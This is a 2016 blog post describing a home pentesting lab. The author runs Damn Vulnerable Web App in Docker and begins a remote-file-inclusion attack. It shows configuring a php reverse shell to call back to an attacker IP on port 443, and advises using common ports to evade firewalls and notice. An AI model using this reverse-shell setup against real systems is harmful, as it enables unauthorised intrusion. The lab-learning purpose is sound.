---
layout: post
title: Attacking Yourself First
date:   2016-12-27 23:43:12 -0600
Categories: homelab docker webapp pentesting
---

## Why not just attack someone else?

Because it's illegal. 

### Attacking a home lab

If you're doing this on a budget, you have a few ways to go about this. You can either use old machines you have laying around to install OSes and applications on and attack those systems or you can do something virtualized. Since I'm doing this on a budget and don't want to reinstall OSes all day, I'm doing this virtualized. I'll be doing this in docker again because why not, but you could just as easily do something in a VM and snapshot it before you really attack. I also am very interested in how docker and containers complicate breaking into systems, so this is as good of a time as any to figure it out.


For this lab, I'm using a docker container of LAMP and a local installation of Damn Vulnerable Web Applications. Let's first get our docker container.

### OK let's go

I'm working off a different Ubuntu image than I usually work off of because I want to be sure my exploits will work (cheating, I know). If we go [here](http://releases.ubuntu.com/) we can find old version of Ubuntu and it even tags the date they were released. I downloaded and installed Server 14.04.5 and installed a few applications

~~~
<Install the OS, select the SSH Server as the additional functionality>
sudo apt-get install git docker.io
sudo usermod -aG docker $USER
<reboot or log out and back in>
~~~

That's enough believe it or not, the rest will come with our container.

Getting this built took longer than I expected, but if you check [my github](https://github.com/remotephone) page you'll see a repo for dvwa-lamp. This is a docker container than includes the [Damn Vulnerable Web App](https://github.com/ethicalhack3r/DVWA) bundled inside a lamp container I forked off [tutum](https://github.com/tutumcloud/lamp).

You can follow the instructions in the README or do just do this:

~~~
git clone https://github.com/remotephone/dvwa-lamp.git
cd dvwa-lamp
docker build -t remotephone/dvwa-lamp .
docker run -d -p 80:80 -p 3306:3306 remotephone/dvwa-lamp 
<wait some seconds and then browse to...>
http://<Victim IP>/setup.php
~~~

And you're set! Install the database by completed the setup and login as admin/password. 

### Explotiation and notes

Now let's get started. We're going to move from a web app to a Docker container and see if we can make it to the host. For the purposes of this demo, I'm going easy mode, we're going to set the security level to "Low" in DVWA Security in the sidebar and then go to the File Inclusion tests.

[Remote File Inclusion](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/) is a nasty vulnerability that allows you to manipulate insecurely coded requests for resources to instead call to resources you control. While the web server may intend to display information from a local file on the webserver, you can instead redirect the webserver to call a file you host and even execute the code if the server knows how to interpret it. One of the most simple examples is tricking a server to  call a php script you host and excuting that to send you a reverse shell.

For this exercise, I'll use [laudunum](https://blog.secureideas.com/2014/01/professionally-evil-software-laudanum.html). While the link for the latest release doesn't work, you can find it in the laudunum package as part of Kali linux. We're going to use the RFI vulnerability to call a webshell we host on our local web server, listen with ncat to catch our reverse shell, use the shell to upload a kernel exploit, and see if we can use that to escape our container. 

To make this work, you need a few things. First, get your container running. Next, get you webshells ready in your /var/www/html directory. I'm using php-reverse-shell.php from the laudunum package and I've updated the file to point back to my attacking server. I always use ports 443 or 80 if possible for reverse shells, firewalls tend to allow this traffic out and it's not suspicious if someone netstats an affected server. This is the part of the webshell I modified:

~~~
$VERSION = "1.0";
$ip = '192.168.1.20';  // CHANGE THIS
$port = 443;       // CHANGE THIS
~~~

It's conveniently marked with "CHANGE THIS" so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. 
